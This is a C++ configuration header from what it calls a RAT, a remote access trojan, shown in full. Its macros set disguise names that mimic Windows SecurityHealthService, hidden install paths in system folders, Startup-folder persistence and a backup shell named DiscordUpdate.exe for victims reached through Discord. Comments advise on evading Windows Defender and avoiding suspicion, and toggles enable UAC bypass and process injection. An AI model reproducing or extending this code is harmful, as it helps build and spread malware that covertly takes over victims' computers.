#pragma once
#include <Lmcons.h>

//This file should contain various useful macros for the project, primarily interesting folders and module names

//Version macro
#define VERSION "2.0"

//Uncommenting this macro will let every module create a console useful for debugging since some modules can't be compiled in debug mode
//such as the main loader and the shell
//#define DEBUG 

//Uncommenting this macro will make the loader perform auto injection instead of relying on the embedded image
//#define SELF_INJECTION

//Uncommenting this macro will make the main loader create the shell on disk bypassing the dll entirely (Defender flagged this behaviour on my PC)
#define NO_DLL

//Uncommenting this macro will enable automatic vertical elevation (UAC bypass)
//#define BYPASS_UAC

//The RAT will attempt to disguise itself as an extension of the already existing SecurityHealthService
#define SERVICE_NAME			"WindowsHealthService"
#define SERVICE_DISPLAY_NAME	"Windows Health Service"
#define SERVICE_FILE_NAME		"SecurityHealthServiceManager.exe"
#define SERVICE_LINK_NAME		"SecurityHealthService.lnk"
#define SERVICE_ARCHIVE_NAME	"external.zip"

#define SHELL_NAME				"SecurityHealthService32.exe"
#define SHELL_UPDATE_NAME		"Update.exe"
//Backup shell should have a "realistic" name based on an application that your target "audience" will have.
//For example if spreading your malware via Discord this could be a realistic name that no one will really look into.
#define SHELL_BACKUP_NAME		"DiscordUpdate.exe"

#define JOIN(x, y) x ## y
//Here I'm just using some random ass folder, just pick an already existing folder, as creating new folders, especially in system locations, is a very sussy thing to do
//Make sure the backup shell path is something not really "expected", and assume they will find the main shell folder first
#define SHELL_PATH(x)			JOIN("C:\\Windows\\ServiceProfiles\\LocalService\\", x)
#define SHELL_BACKUP_PATH(x)	JOIN("C:\\Windows\\ServiceProfiles\\NetworkService\\Downloads\\", x)
#define STARTUP_PATH(x)			JOIN("C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\", x)
//#define SHELL_SERVICE_PATH(x)   JOIN("C:\\Users")

#define SHELL_DIRECTORY			"C:\\Windows\\ServiceProfiles\\LocalService"
#define SHELL_BACKUP_DIRECTORY	"C:\\Windows\\ServiceProfiles\\NetworkService\\Downloads"
#define STARTUP_DIRECTORY		"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp"

__forceinline std::string ShellServiceDirectory() {
	TCHAR name[UNLEN + 1];
	DWORD size = UNLEN + 1;

	if (GetUserName((TCHAR*)name, &size))
		return std::string("C:\\Users\\") + name + "\\AppData\\Local\\Microsoft Updater";
	else
		return "C:\\Users\\Default\\AppData\\Local\\Microsoft Updater";
}
__forceinline std::string ShellServicePath(LPCSTR file_name) {
	TCHAR name[UNLEN + 1];
	DWORD size = UNLEN + 1;

	if (GetUserName((TCHAR*)name, &size))
		return std::string("C:\\Users\\") + name + "\\AppData\\Local\\Microsoft Updater\\" + file_name;
	else
		return "C:\\Users\\Default\\AppData\\Local\\Microsoft Updater\\" + std::string(file_name);
}

//Macros used to get the full path to both shells
#define SHELL_EXE				SHELL_PATH(SHELL_NAME)
#define SHELL_BACKUP_EXE		SHELL_BACKUP_PATH(SHELL_BACKUP_NAME)


#ifdef	_WIN64
#define FULL_PATH(x)			JOIN("C:\\Windows\\System32\\", x)
#else
#define FULL_PATH(x)			JOIN("C:\\Windows\\SysWOW64\\", x)
#endif

//Used to log information to the spawned console
#ifdef	DEBUG
#define Log(x)					std::cout << (x)
#else
#define Log(x) 
#endif

#define ExePath ExePathA
